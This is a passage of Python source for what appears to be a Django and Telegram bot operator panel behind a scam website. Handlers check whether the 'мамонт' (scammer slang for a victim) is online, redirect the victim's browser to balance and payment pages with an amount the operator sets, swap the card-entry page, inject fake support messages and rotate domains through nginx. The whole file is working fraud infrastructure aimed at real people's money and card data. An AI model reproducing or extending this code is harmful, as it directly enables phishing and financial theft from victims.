        keyboard = InlineKeyboardMarkup()

        for button in buttons:
            keyboard.add(InlineKeyboardButton(text=button.text, callback_data=button.data))

        bot.send_message(user.tg_id, text, reply_markup=keyboard, parse_mode="HTML")







    def change_link_name_input(self, bot, state, user, callback_data, callback_id, message, event):
        self.val = {}  # Очищаем переменные для каждого нового вызова
        print(f'''
            user - {user}
            call_data - {callback_data}
            call_id - {callback_id}
            message - {message}''')

        user.state = state.current_state
        user.save()

        link_id = callback_data.split(' ')[1]
        link = DataUserSite.objects.get(id=int(link_id))

        user.token_temporary = link.token
        user.save()



        # Добавляем базовые переменные
        self.val['user_name'] = user.name if hasattr(user, 'name') else 'Пользователь'
        self.val['user_id'] = user.tg_id
        self.val['text'] = 'Базовое сообщение'  # Значение по умолчанию

        # Форматируем текст с использованием переменных
        text = self.format_message_text(state.text)

        buttons = Bot_Button.objects.filter(message_trigger=state).order_by('id')
        keyboard = InlineKeyboardMarkup()

        for button in buttons:
            keyboard.add(InlineKeyboardButton(text=button.text, callback_data=button.data))

        bot.send_message(user.tg_id, text, reply_markup=keyboard, parse_mode="HTML")






    def change_link_name(self, bot, state, user, callback_data, callback_id, message, event):
        self.val = {}  # Очищаем переменные для каждого нового вызова
        print(f'''
            user - {user}
            call_data - {callback_data}
            call_id - {callback_id}
            message - {message}''')

        user.state = state.current_state
        user.save()

        
        link = DataUserSite.objects.get(token=(user.token_temporary))
        link.name = message['text']
        link.save()

        user.token_temporary = ' '
        user.save()


        # Добавляем базовые переменные
        self.val['user_name'] = user.name if hasattr(user, 'name') else 'Пользователь'
        self.val['user_id'] = user.tg_id
        self.val['text'] = 'Базовое сообщение'  # Значение по умолчанию

        # Форматируем текст с использованием переменных
        text = self.format_message_text(state.text)

        buttons = Bot_Button.objects.filter(message_trigger=state).order_by('id')
        keyboard = InlineKeyboardMarkup()

        for button in buttons:
            keyboard.add(InlineKeyboardButton(text=button.text, callback_data=button.data))

        bot.send_message(user.tg_id, text, reply_markup=keyboard, parse_mode="HTML")








    def change_adress_input(self, bot, state, user, callback_data, callback_id, message, event):
        self.val = {}  # Очищаем переменные для каждого нового вызова
        print(f'''
            user - {user}
            call_data - {callback_data}
            call_id - {callback_id}
            message - {message}''')

        user.state = state.current_state
        user.save()

        link_id = callback_data.split(' ')[1]
        link = DataUserSite.objects.get(id=int(link_id))

        user.token_temporary = link.token
        user.save()



        # Добавляем базовые переменные
        self.val['user_name'] = user.name if hasattr(user, 'name') else 'Пользователь'
        self.val['user_id'] = user.tg_id
        self.val['text'] = 'Базовое сообщение'  # Значение по умолчанию

        # Форматируем текст с использованием переменных
        text = self.format_message_text(state.text)

        buttons = Bot_Button.objects.filter(message_trigger=state).order_by('id')
        keyboard = InlineKeyboardMarkup()

        for button in buttons:
            keyboard.add(InlineKeyboardButton(text=button.text, callback_data=button.data))

        bot.send_message(user.tg_id, text, reply_markup=keyboard, parse_mode="HTML")






    def change_adress(self, bot, state, user, callback_data, callback_id, message, event):
        self.val = {}  # Очищаем переменные для каждого нового вызова
        print(f'''
            user - {user}
            call_data - {callback_data}
            call_id - {callback_id}
            message - {message}''')

        user.state = state.current_state
        user.save()

        
        link = DataUserSite.objects.get(token=(user.token_temporary))
        link.address = message['text']
        link.save()

        user.token_temporary = ' '
        user.save()


        # Добавляем базовые переменные
        self.val['user_name'] = user.name if hasattr(user, 'name') else 'Пользователь'
        self.val['user_id'] = user.tg_id
        self.val['text'] = 'Базовое сообщение'  # Значение по умолчанию

        # Форматируем текст с использованием переменных
        text = self.format_message_text(state.text)

        buttons = Bot_Button.objects.filter(message_trigger=state).order_by('id')
        keyboard = InlineKeyboardMarkup()

        for button in buttons:
            keyboard.add(InlineKeyboardButton(text=button.text, callback_data=button.data))

        bot.send_message(user.tg_id, text, reply_markup=keyboard, parse_mode="HTML")

















    def check_the_location_on_website(self, bot, state, user, callback_data, callback_id, message, event):
        self.val = {}  # Очищаем переменные для каждого нового вызова
        print(f'''
            user - {user}
            call_data - {callback_data}
            call_id - {callback_id}
            message - {message}''')

        user.state = state.current_state
        user.save()

        token = callback_data.split(' ')[1]
        datausersite = DataUserSite.objects.get(token=token)
        

        user_view = is_user_active(token)

        # Добавляем базовые переменные
        if user_view:
            self.val['user_view'] = "Мамонт на сайте ✅"
        else:
            self.val['user_view'] = "Мамонт ушел ❌"

        # Форматируем текст с использованием переменных
        text = self.format_message_text(state.text)

        buttons = Bot_Button.objects.filter(message_trigger=state)
        keyboard = InlineKeyboardMarkup()
        for button in buttons:
            keyboard.add(InlineKeyboardButton(text=button.text, callback_data=button.data))

        bot.send_message(CHAT_ADMIN_ID, text, reply_markup=keyboard, parse_mode="HTML")




    
    def balance_page(self, bot, state, user, callback_data, callback_id, message, event):
        self.val = {}  # Очищаем переменные для каждого нового вызова
        print(f'''
            user - {user}
            call_data - {callback_data}
            call_id - {callback_id}
            message - {message}''')

        user.state = state.current_state
        user.save()


        token = callback_data.split(' ')[1]
        datausersite = DataUserSite.objects.get(token=token)


        updated_json = {
            token: {
                'page': f'/balance/{token}/',
                'view_window': False
            }
        }
        datausersite.data_json = updated_json
        datausersite.save()


        # Добавляем базовые переменные
        self.val['user_name'] = user.name if hasattr(user, 'name') else 'Пользователь'
        self.val['user_id'] = user.tg_id
        self.val['text'] = 'Базовое сообщение'  # Значение по умолчанию

        # Форматируем текст с использованием переменных
        text = self.format_message_text(state.text)

        buttons = Bot_Button.objects.filter(message_trigger=state)
        keyboard = InlineKeyboardMarkup()
        for button in buttons:
            keyboard.add(InlineKeyboardButton(text=button.text, callback_data=button.data))

        bot.send_message(CHAT_ADMIN_ID, text, reply_markup=keyboard, parse_mode="HTML")




    def changing_the_card_page(self, bot, state, user, callback_data, callback_id, message, event):
        self.val = {}  # Очищаем переменные для каждого нового вызова
        print(f'''
            user - {user}
            call_data - {callback_data}
            call_id - {callback_id}
            message - {message}''')

        user.state = state.current_state
        user.save()


        token = callback_data.split(' ')[1]
        datausersite = DataUserSite.objects.get(token=token)

        updated_json = {
            token: {
                'page': f'/pay/{token}/',
                'view_window': False
            }
        }
        datausersite.data_json = updated_json
        datausersite.save()

        # Добавляем базовые переменные
        self.val['user_name'] = user.name if hasattr(user, 'name') else 'Пользователь'
        self.val['user_id'] = user.tg_id
        self.val['text'] = 'Базовое сообщение'  # Значение по умолчанию

        # Форматируем текст с использованием переменных
        text = self.format_message_text(state.text)

        buttons = Bot_Button.objects.filter(message_trigger=state)
        keyboard = InlineKeyboardMarkup()
        for button in buttons:
            keyboard.add(InlineKeyboardButton(text=button.text, callback_data=button.data))

        bot.send_message(CHAT_ADMIN_ID, text, reply_markup=keyboard, parse_mode="HTML")




    def replenishment_page_input(self, bot, state, user, callback_data, callback_id, message, event):
        self.val = {}  # Очищаем переменные для каждого нового вызова
        print(f'''
            user - {user}
            call_data - {callback_data}
            call_id - {callback_id}
            message - {message}''')

        user.state = state.current_state
        user.save()

        token = callback_data.split(' ')[1]
        self.val['token'] = token
        user.token_temporary = token
        user.save()

        # Форматируем текст с использованием переменных
        text = self.format_message_text(state.text)


        buttons = Bot_Button.objects.filter(message_trigger=state)
        keyboard = InlineKeyboardMarkup()
        for button in buttons:
            keyboard.add(InlineKeyboardButton(text=button.text, callback_data=button.data))

        bot.send_message(CHAT_ADMIN_ID, text, reply_markup=keyboard, parse_mode="HTML")











    def replenishment_page(self, bot, state, user, callback_data, callback_id, message, event):
        print(f'''
            user - {user}
            call_data - {callback_data}
            call_id - {callback_id}
            message - {message}''')

        user.state = state.current_state
        user.save()

        count = message['text']
        token = user.token_temporary
        print(token)

        datausersite = DataUserSite.objects.get(token=token)

        updated_json = {
            token: {
                'page': f'/pay/{token}/',
                'view_window': True,
                'count': count
            }
        }
        datausersite.data_json = updated_json
        datausersite.save()

        # Добавляем базовые переменные
        self.val['user_name'] = user.name if hasattr(user, 'name') else 'Пользователь'
        self.val['user_id'] = user.tg_id
        self.val['text'] = 'Базовое сообщение'  # Значение по умолчанию
        
        user.token_temporary = ''
        user.save()
        # Форматируем текст с использованием переменных
        text = self.format_message_text(state.text)

        buttons = Bot_Button.objects.filter(message_trigger=state)
        keyboard = InlineKeyboardMarkup()
        for button in buttons:
            keyboard.add(InlineKeyboardButton(text=button.text, callback_data=button.data))

        bot.send_message(CHAT_ADMIN_ID, text, reply_markup=keyboard, parse_mode="HTML")








    def message_in_tp(self, bot, state, user, callback_data, callback_id, message, event):
        self.val = {}  # Очищаем переменные для каждого нового вызова
        print(f'''
            user - {user}
            call_data - {callback_data}
            call_id - {callback_id}
            message - {message}''')

        user.state = state.current_state
        user.save()

        token = callback_data.split(' ')[1]
        self.val['token'] = token
        user.token_temporary = token
        user.save()

        # Форматируем текст с использованием переменных
        text = self.format_message_text(state.text)


        buttons = Bot_Button.objects.filter(message_trigger=state)
        keyboard = InlineKeyboardMarkup()
        for button in buttons:
            keyboard.add(InlineKeyboardButton(text=button.text, callback_data=button.data))

        bot.send_message(CHAT_ADMIN_ID, text, reply_markup=keyboard, parse_mode="HTML")






    def message_in_tp_send(self, bot, state, user, callback_data, callback_id, message, event):
        print(f'''
            user - {user}
            call_data - {callback_data}
            call_id - {callback_id}
            message - {message}''')

        user.state = state.current_state
        user.save()

        token = user.token_temporary
        print(token)

        datausersite = DataUserSite.objects.get(token=token)

        support_json = {
            token: {
                'admin': message['text'],
            }
        }
        datausersite.support_json = support_json
        datausersite.save()

        # Добавляем базовые переменные
        self.val['user_name'] = user.name if hasattr(user, 'name') else 'Пользователь'
        self.val['user_id'] = user.tg_id
        self.val['text'] = 'Базовое сообщение'  # Значение по умолчанию
        
        user.token_temporary = ''
        user.save()
        # Форматируем текст с использованием переменных
        text = self.format_message_text(state.text)

        buttons = Bot_Button.objects.filter(message_trigger=state)
        keyboard = InlineKeyboardMarkup()
        for button in buttons:
            keyboard.add(InlineKeyboardButton(text=button.text, callback_data=button.data))

        bot.send_message(CHAT_ADMIN_ID, text, reply_markup=keyboard, parse_mode="HTML")






    def updating_domains(self, bot, state, user, callback_data, callback_id, message, event):
        self.val = {}  # Очищаем переменные для каждого нового вызова
        print(f'''
            user - {user}
            call_data - {callback_data}
            call_id - {callback_id}
            message - {message}''')

        # Функция для запуска nginx_config_manager в отдельном потоке
        def restart_nginx_config():
            try:
                subprocess.run(['python', 'manage.py', 'nginx_config_manager', '--restart'], 
                            check=True, 
                            stdout=subprocess.PIPE, 
                            stderr=subprocess.PIPE)
            except subprocess.CalledProcessError as e:
                print(f"Ошибка при перезапуске nginx: {e.stderr.decode()}")

        # Запуск nginx_config_manager в отдельном потоке
        threading.Thread(target=restart_nginx_config, daemon=True).start()

        user.state = state.current_state
        user.save()

        # Добавляем базовые переменные
        self.val['user_name'] = user.name if hasattr(user, 'name') else 'Пользователь'
        self.val['user_id'] = user.tg_id
        self.val['text'] = 'Базовое сообщение'  # Значение по умолчанию

        # Форматируем текст с использованием переменных
        text = self.format_message_text(state.text)

        buttons = Bot_Button.objects.filter(message_trigger=state)
        keyboard = InlineKeyboardMarkup()
        for button in buttons:
            keyboard.add(InlineKeyboardButton(text=button.text, callback_data=button.data))

        bot.send_message(user.tg_id, text, reply_markup=keyboard, parse_mode="HTML")